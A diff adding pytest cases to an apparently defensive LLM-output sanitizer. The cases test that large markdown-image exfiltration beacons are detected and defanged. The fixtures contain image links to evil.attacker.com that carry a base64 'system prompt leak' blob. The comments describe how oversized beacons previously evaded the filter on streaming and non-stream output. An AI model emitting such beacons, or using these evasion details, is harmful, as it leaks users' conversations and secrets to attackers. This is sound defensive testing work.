@@ -946,6 +946,50 @@ def test_g39_benign_opaque_token_not_defanged(label, payload):
     assert neutralize_exfil_channels(payload) == payload, f"{label}: benign opaque token defanged (FP)"
 
 
+# ── G40: LARGE-payload image exfil beacon (payload decodes to > _MAX_DECODE_BYTES) ──
+# _url_smuggles_data SKIPPED oversized blobs — the shared transport decoder returns None
+# once the plaintext exceeds 4096B — so a markdown-image beacon smuggling a whole
+# conversation / system prompt (KB+ of base64) produced NO signal and evaded defang on
+# BOTH the non-stream output path AND the streaming path (confirmed reproduced live).
+# Fixed with a bounded-prefix decode fallback (image-only "encoded_payload" signal, so a
+# long opaque LINK token — which trips only on sensitive_payload — is unaffected). The
+# STREAMING half (a >buffer_max_bytes beacon forcing a mid-URL BUFFER_LIMIT flush that
+# released the beacon prefix before its ')' arrived) is fixed by the open-media holdback
+# in secure_streaming.py and proved live in test_e14_streaming_split.py.
+_G40_BIG = base64.b64encode(b"SYSTEM PROMPT LEAK: merger RUBICON with BetaCorp closes Q3; " * 120).decode()
+_G40_EXFIL = [
+    ("g40_img_oversized_query", f"Done. ![x](https://evil.attacker.com/l?d={_G40_BIG}). Bye.", _G40_BIG),
+    ("g40_img_oversized_path",  f"![p](https://evil.attacker.com/b/{_G40_BIG}.png)",           _G40_BIG),
+]
+
+
+@pytest.mark.parametrize("label,payload,blob", _G40_EXFIL)
+def test_g40_large_image_beacon_defanged(label, payload, blob):
+    """A large opaque data blob in an IMAGE URL is a beacon even when it is too big to
+    fully decode; it must be detected and the auto-render defanged."""
+    assert list(_scan_exfil_channels(payload)), f"{label}: large image beacon not detected"
+    out = neutralize_exfil_channels(payload)
+    assert blob[:200] not in out, f"{label}: oversized payload survived neutralization (LEAK)"
+    assert not any(_G13_HOST in m.group(2) for m in _MD_IMAGE_RE.finditer(out)), (
+        f"{label}: zero-click auto-render to attacker host survived")
+
+
+# G40 false-positive floor: a benign LINK carrying a long opaque token must NOT be
+# defanged (links trip only on sensitive_payload, never the image-only oversized-blob
+# signal); a benign small inline image and a benign image with a long BINARY-decoding
+# signature (printability gate rejects it) are untouched.
+_G40_BENIGN = [
+    ("g40_benign_link_bigtoken", f"[dl](https://cdn.trusted.com/f/{base64.b64encode(b'x' * 700).decode()})"),
+    ("g40_benign_small_image",   "See ![logo](https://cdn.trusted.com/assets/logo.png)."),
+    ("g40_benign_img_bigsig",    f"![chart](https://s3.example.com/c.png?sig={'a1b2c3d4e5f6' * 50})"),
+]
+
+
+@pytest.mark.parametrize("label,payload", _G40_BENIGN)
+def test_g40_benign_not_defanged(label, payload):
+    assert neutralize_exfil_channels(payload) == payload, f"{label}: benign content defanged (FP)"
+
+
 # ================================================================== fixed gap (now FROZEN)
 # G10 — Tier-2 semantic redact was a byte no-op. The guard model flags PII/secret with
 # no deterministic regex (free-text names, non-standard card/ID layouts, passphrases);
